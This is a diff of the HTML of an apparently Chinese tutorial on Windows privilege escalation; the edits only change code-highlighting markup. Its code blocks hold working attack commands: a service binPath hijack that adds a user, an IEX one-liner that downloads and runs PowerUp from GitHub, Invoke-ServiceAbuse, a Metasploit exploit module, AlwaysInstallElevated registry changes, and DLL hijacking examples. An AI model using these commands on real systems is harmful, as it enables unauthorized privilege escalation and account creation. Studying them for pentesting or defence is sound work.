@@ -241,28 +241,28 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 查询系统信息</span>
-systeminfo 
-<span class="c1"># 如果要查看特定的信息，可以使用</span>
-systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS名称&#34;</span> /C:<span class="s2">&#34;OS版本&#34;</span>
-<span class="c1"># 主机名</span>
-Hostname
-<span class="c1"># 环境变量</span>
-Set
-<span class="c1"># 查看用户信息</span>
-Net user
-<span class="c1"># 查看服务 pid 号</span>
-tasklist /svc<span class="p">|</span>find <span class="s2">&#34;TermService&#34;</span>
-netstat -ano<span class="p">|</span>find <span class="s2">&#34;3389&#34;</span>
-<span class="c1"># 查看系统名</span>
-wmic os get caption
-<span class="c1"># 查看补丁信息</span>
-wmic qfe get Description,HotFixID,InstalledOn
-<span class="c1"># 如果要定位到特定的补丁可以使用如下命令</span>
-wmic qfe get Description,HotFixID,InstalledOn <span class="p">|</span> findstr /C:<span class="s2">&#34;KB4346084&#34;</span> /C:<span class="s2">&#34;KB4509094&#34;</span>
-<span class="c1"># 查看当前安装程序</span>
-wmic product get name,version
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查询系统信息</span>
+</span></span><span class="line"><span class="cl">systeminfo 
+</span></span><span class="line"><span class="cl"><span class="c1"># 如果要查看特定的信息，可以使用</span>
+</span></span><span class="line"><span class="cl">systeminfo <span class="p">|</span> findstr /B /C:<span class="s2">&#34;OS名称&#34;</span> /C:<span class="s2">&#34;OS版本&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 主机名</span>
+</span></span><span class="line"><span class="cl">Hostname
+</span></span><span class="line"><span class="cl"><span class="c1"># 环境变量</span>
+</span></span><span class="line"><span class="cl">Set
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看用户信息</span>
+</span></span><span class="line"><span class="cl">Net user
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看服务 pid 号</span>
+</span></span><span class="line"><span class="cl">tasklist /svc<span class="p">|</span>find <span class="s2">&#34;TermService&#34;</span>
+</span></span><span class="line"><span class="cl">netstat -ano<span class="p">|</span>find <span class="s2">&#34;3389&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看系统名</span>
+</span></span><span class="line"><span class="cl">wmic os get caption
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看补丁信息</span>
+</span></span><span class="line"><span class="cl">wmic qfe get Description,HotFixID,InstalledOn
+</span></span><span class="line"><span class="cl"><span class="c1"># 如果要定位到特定的补丁可以使用如下命令</span>
+</span></span><span class="line"><span class="cl">wmic qfe get Description,HotFixID,InstalledOn <span class="p">|</span> findstr /C:<span class="s2">&#34;KB4346084&#34;</span> /C:<span class="s2">&#34;KB4509094&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看当前安装程序</span>
+</span></span><span class="line"><span class="cl">wmic product get name,version
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>其中需要注意一下 <code>环境变量</code>，因为有的软件环境变量可能设置在其它路径中，而在该路径下的文件是具有写权限的，就可以通过<strong>替换文件</strong>来达到提权操作</p>
 <h3 id="12-windows-权限划分">1.2 Windows 权限划分</h3>
@@ -299,12 +299,12 @@ wmic product get name,version
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">systeminfo
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-<span class="c1"># msf</span>
-post/windows/gather/enum_patches
-Windows-Exploit-Suggester
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">systeminfo
+</span></span><span class="line"><span class="cl">wmic qfe get Caption,Description,HotFixID,InstalledOn
+</span></span><span class="line"><span class="cl"><span class="c1"># msf</span>
+</span></span><span class="line"><span class="cl">post/windows/gather/enum_patches
+</span></span><span class="line"><span class="cl">Windows-Exploit-Suggester
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>下面是辅助提权的页面：</p>
 <ul>
@@ -364,12 +364,12 @@ Windows-Exploit-Suggester
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 注意这里的&#34;=&#34;后面要留有空格</span>
-sc config VMTools <span class="nv">binPath</span><span class="o">=</span> <span class="s2">&#34;net user test1 abc123! /add&#34;</span>  
-
-<span class="c1"># 查看查询该服务的执行路径是否修改成功</span>
-sc qc VMTools  
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 注意这里的&#34;=&#34;后面要留有空格</span>
+</span></span><span class="line"><span class="cl">sc config VMTools <span class="nv">binPath</span><span class="o">=</span> <span class="s2">&#34;net user test1 abc123! /add&#34;</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看查询该服务的执行路径是否修改成功</span>
+</span></span><span class="line"><span class="cl">sc qc VMTools  
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>重启服务</li>
@@ -380,9 +380,9 @@ sc qc VMTools
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sc stop VMTools
-sc start VMTools
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sc stop VMTools
+</span></span><span class="line"><span class="cl">sc start VMTools
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>但要注意这里启动时会报错，因为当一个服务在 Windows 系统中启动后，它必须和服务控制管理器通信。如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程。但是我们的命令已经以 SYSTEM 权限运行了，并且成功添加了一个用户。</p>
 <div class="details admonition info open">
@@ -414,13 +414,13 @@ sc start VMTools
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">icacls <span class="s2">&#34;C:\Program Files\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;Everyone&#34;</span>
-
-icacls <span class="s2">&#34;C:\Program Files(x86)\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;Everyone&#34;</span>
-
-icacls <span class="s2">&#34;C:\Program Files\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;BUILTIN\Users&#34;</span>
-icacls <span class="s2">&#34;C:\Program Files(x86)\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;BUILTIN\Users&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">icacls <span class="s2">&#34;C:\Program Files\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;Everyone&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">icacls <span class="s2">&#34;C:\Program Files(x86)\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;Everyone&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">icacls <span class="s2">&#34;C:\Program Files\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;BUILTIN\Users&#34;</span>
+</span></span><span class="line"><span class="cl">icacls <span class="s2">&#34;C:\Program Files(x86)\*&#34;</span> 2&gt;nul <span class="p">|</span> findstr <span class="s2">&#34;(M)&#34;</span> <span class="p">|</span> findstr <span class="s2">&#34;BUILTIN\Users&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
         </div>
@@ -433,10 +433,10 @@ icacls <span class="s2">&#34;C:\Program Files(x86)\*&#34;</span> 2&gt;nul <span 
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;); Invoke-AllChecks&#34;</span>
-
-<span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module D:/PowerUp.ps1; Invoke-AllChecks}&#34;</span> <span class="p">&gt;</span> <span class="n">1</span><span class="p">.</span><span class="n">txt</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;); Invoke-AllChecks&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module D:/PowerUp.ps1; Invoke-AllChecks}&#34;</span> <span class="p">&gt;</span> <span class="n">1</span><span class="p">.</span><span class="n">txt</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>列出了所有可能存在问题的服务：</p>
 <p><img
@@ -468,8 +468,8 @@ icacls <span class="s2">&#34;C:\Program Files(x86)\*&#34;</span> 2&gt;nul <span 
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module C:/PowerUp.ps1;Invoke-ServiceAbuse -Name &#39;VGAuthService&#39; -Username user -Password 123456}&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module C:/PowerUp.ps1;Invoke-ServiceAbuse -Name &#39;VGAuthService&#39; -Username user -Password 123456}&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="313-metasploit">3.1.3 metasploit</h4>
 <div class="highlight"><div class="chroma">
@@ -480,11 +480,11 @@ icacls <span class="s2">&#34;C:\Program Files(x86)\*&#34;</span> 2&gt;nul <span 
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">use exploit/windows/local/service_permissions
-<span class="nb">set</span> AGGRESSIVE <span class="nb">true</span>
-<span class="nb">set</span> session <span class="m">1</span>
-exploit
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/local/service_permissions
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> AGGRESSIVE <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> session <span class="m">1</span>
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="32-可信任服务路径提权">3.2 可信任服务路径提权</h3>
 <p>可信任服务路径漏洞利用了 Windows 文件路径解析的特性，如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，同时攻击者该文件路径有可写权限，攻击者就可以上传文件来劫持路径名。</p>
@@ -508,8 +508,8 @@ exploit
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wmic service get name,displayname,pathname,startmode<span class="p">|</span>findstr /i <span class="s2">&#34;Auto&#34;</span> <span class="p">|</span>findstr /i /v <span class="s2">&#34;C:\Windows\&#34; |findstr/i /v &#34;&#34;&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wmic service get name,displayname,pathname,startmode<span class="p">|</span>findstr /i <span class="s2">&#34;Auto&#34;</span> <span class="p">|</span>findstr /i /v <span class="s2">&#34;C:\Windows\&#34; |findstr/i /v &#34;&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -528,10 +528,10 @@ exploit
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">icacls <span class="s2">&#34;C:&#34;</span>
-icacls <span class="s2">&#34;C:\Program Files&#34;</span>
-icacls <span class="s2">&#34;C:\Program Files\VMware&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">icacls <span class="s2">&#34;C:&#34;</span>
+</span></span><span class="line"><span class="cl">icacls <span class="s2">&#34;C:\Program Files&#34;</span>
+</span></span><span class="line"><span class="cl">icacls <span class="s2">&#34;C:\Program Files\VMware&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>依次查看各级目录是否有可写权限，最后找到 C:\Program Files\VMware 目录，在该目录下方式木马，上线后，即为高权限。</p>
 <h4 id="333-msf-中的模块">3.3.3 msf 中的模块</h4>
@@ -543,8 +543,8 @@ icacls <span class="s2">&#34;C:\Program Files\VMware&#34;</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select </span><span class="p">*</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">TaskPath</span> <span class="o">-notlike</span> <span class="s2">&#34;\Microsoft\Windows\*&#34;</span><span class="p">)</span> <span class="o">-And</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">UserId</span> <span class="o">-notlike</span> <span class="s2">&#34;*$env:UserName*&#34;</span><span class="p">)}</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-Property</span> <span class="n">State</span><span class="p">,</span> <span class="n">Actions</span><span class="p">,</span> <span class="n">Date</span><span class="p">,</span> <span class="n">TaskPath</span><span class="p">,</span> <span class="n">TaskName</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">&#34;User&#34;</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">userID</span><span class="p">}}</span> 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select </span><span class="p">*</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">TaskPath</span> <span class="o">-notlike</span> <span class="s2">&#34;\Microsoft\Windows\*&#34;</span><span class="p">)</span> <span class="o">-And</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">UserId</span> <span class="o">-notlike</span> <span class="s2">&#34;*$env:UserName*&#34;</span><span class="p">)}</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-Property</span> <span class="n">State</span><span class="p">,</span> <span class="n">Actions</span><span class="p">,</span> <span class="n">Date</span><span class="p">,</span> <span class="n">TaskPath</span><span class="p">,</span> <span class="n">TaskName</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">&#34;User&#34;</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">userID</span><span class="p">}}</span> 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看某个目录的权限配置情况</p>
 <div class="highlight"><div class="chroma">
@@ -552,8 +552,8 @@ icacls <span class="s2">&#34;C:\Program Files\VMware&#34;</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">accesschk64.exe -dqv <span class="s2">&#34;/path/to/dir&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">accesschk64.exe -dqv <span class="s2">&#34;/path/to/dir&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果攻击者对某个高权限的计划任务所在的路径有可写权限，可使用恶意程序覆盖原来的程序，当计划任务下次执行时，就会以高权限运行恶意程序。</p>
 <h2 id="4-alwaysinstallelevated-提权">4 AlwaysInstallElevated 提权</h2>
@@ -566,9 +566,9 @@ icacls <span class="s2">&#34;C:\Program Files\VMware&#34;</span>
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
-reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
+</span></span><span class="line"><span class="cl">reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>未启用 AlwaysInstallElevated 策略，返回结果为：「找不到指定的注册表项或值」</p>
 <h3 id="42-开启">4.2 开启</h3>
@@ -578,9 +578,9 @@ reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">reg add HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated /t REG_DWORD /d <span class="m">1</span>
-reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated /t REG_DWORD /d <span class="m">1</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg add HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated /t REG_DWORD /d <span class="m">1</span>
+</span></span><span class="line"><span class="cl">reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated /t REG_DWORD /d <span class="m">1</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="43-执行-msi-文件">4.3 执行 MSI 文件</h3>
 <p>本地执行：<code>msiexec /q /i C:\msi.msi</code></p>
@@ -611,9 +611,9 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
-<span class="nb">Get-RegistryAlwaysInstallElevated</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-RegistryAlwaysInstallElevated</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>返回 True 代表开启。</p>
 <h4 id="442-msi-wrapper-添加用户">4.4.2 MSI Wrapper 添加用户</h4>
@@ -644,8 +644,8 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">dir /s *sysprep.inf *sysprep.xml *unattend.xml *unattend.txt 2&gt;nul
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dir /s *sysprep.inf *sysprep.xml *unattend.xml *unattend.txt 2&gt;nul
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>常见位置：</p>
 <ul>
@@ -707,8 +707,8 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>当 SafeDllSearchMode 的值设置为 1，即安全 DLL 搜索模式开启时，查找 DLL 的目录顺序如下：</p>
 <ol>
@@ -728,8 +728,8 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Windows 操作系统通过「DLL路径搜索目录顺序」和「Know DLLs注册表项」的机制来确定应用程序所要调用的 DLL 的路径，之后，应用程序就将 DLL 载入了自己的内存空间，执行相应的函数功能。</p>
 <p>注册表路径：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p>
@@ -762,15 +762,15 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span> 
-<span class="c1">// 指向自身的句柄
-</span><span class="c1"></span> <span class="n">_In_</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> 
-<span class="c1">// 调用原因
-</span><span class="c1"></span> <span class="n">_In_</span> <span class="n">DWORD</span>     <span class="n">fdwReason</span><span class="p">,</span>
-<span class="c1">// 加载方式（隐式、显式）
-</span><span class="c1"></span>  <span class="n">_In_</span> <span class="n">LPVOID</span>    <span class="n">lpvReserved</span>
-<span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">// 指向自身的句柄
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="n">_In_</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">// 调用原因
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="n">_In_</span> <span class="n">DWORD</span>     <span class="n">fdwReason</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 加载方式（隐式、显式）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_In_</span> <span class="n">LPVOID</span>    <span class="n">lpvReserved</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><table>
 <thead>
@@ -826,26 +826,26 @@ reg add HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<s
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">){</span>
-  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hModule.%p lpReserved.%p </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">lpReserved</span><span class="p">);</span>
-  <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
-  <span class="p">{</span>
-    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
-      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Process attach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-      <span class="k">break</span><span class="p">;</span>
-    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Process detach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-    	<span class="k">break</span><span class="p">;</span>
-    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Thread attach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-    	<span class="k">break</span><span class="p">;</span>
-    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Thread detach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-    	<span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="k">return</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hModule.%p lpReserved.%p </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">lpReserved</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Process attach. </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
